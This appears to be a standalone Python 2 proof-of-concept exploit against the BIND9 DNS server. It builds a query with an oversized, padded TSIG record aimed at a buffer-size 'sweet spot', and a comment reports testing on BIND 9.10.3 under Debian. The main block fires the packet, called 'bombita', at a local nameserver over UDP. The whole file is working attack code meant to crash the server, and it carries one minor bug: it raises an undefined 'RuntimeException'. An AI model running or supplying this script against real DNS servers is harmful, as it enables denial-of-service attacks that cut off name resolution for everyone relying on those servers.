import socket
import struct

Q_A = 1
Q_TXT = 16
Q_SOA = 6
Q_TSIG = 250
COOKIE_OPT_CODE = 10
DNS_MESSAGE_HEADERLEN = 12

def build_bind_nuke(question="\x06google\x03com\x00", udpsize=512):
    sweet_spot = udpsize - DNS_MESSAGE_HEADERLEN + 1
    additional_rr = 1
    
    query = "\x8f\x65\x00\x00\x00\x01\x00\x00\x00\x00" + int16(additional_rr) + question + int16(Q_SOA) + "\x00\x01"
    tsig_rr = build_tsig_rr(sweet_spot)
    
    return query + tsig_rr

def int16(n):
    return struct.pack("!H", n)

def build_tsig_rr(bind_demarshalled_size):
    signature_data = ("\x00\x00\x57\xeb\x80\x14\x01\x2c\x00\x10\xd2\x2b\x32\x13\xb0\x09"
                      "\x46\x34\x21\x39\x58\x62\xf3\xd5\x9c\x8b\x8f\x65\x00\x00\x00\x00")
    tsig_rr_extra_fields = "\x00\xff\x00\x00\x00\x00"

    necessary_bytes = len(signature_data) + len(tsig_rr_extra_fields) + 2 + 2

    # from len(tsig) bytes conforming the tsig RR
    # bind9 stores len(tsig) - 16 on memory (seen on 9.10.3.dfsg.P4-10.1 on Debian stretch/sid)
    sign_name, algo_name = generate_padding(bind_demarshalled_size - necessary_bytes + 16)

    tsig_rr = sign_name + int16(Q_TSIG) + tsig_rr_extra_fields
    tsig_data = algo_name + signature_data
    return tsig_rr + int16(len(tsig_data)) + tsig_data

def generate_padding(n):
    max_per_bucket = [0x3f, 0x3f, 0x3f, 0x3d, 0x3f, 0x3f, 0x3f, 0x3d]
    buckets = [1] * len(max_per_bucket)
    
    min_size = len(buckets) * 2 + 2 # 2 bytes for every bucket plus each null byte
    max_size = sum(max_per_bucket) + len(buckets) + 2
    
    if not(min_size <= n <= max_size):
        raise RuntimeException("unsupported amount of bytes")

    curr_idx, n = 0, n - min_size
    while n > 0:
        next_n = max(n - (max_per_bucket[curr_idx] - 1), 0)
        buckets[curr_idx] = 1 + n - next_n
        n, curr_idx = next_n, curr_idx + 1

    n_padding = lambda amount: chr(amount) + "A" * amount
    stringify = lambda sizes: "".join(map(n_padding, sizes)) + "\x00"
    
    return stringify(buckets[:4]), stringify(buckets[4:])

if __name__ == "__main__":
    bombita = build_bind_nuke()
    ns = ('127.0.0.1', 53)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bombita, ns)
    s.close()
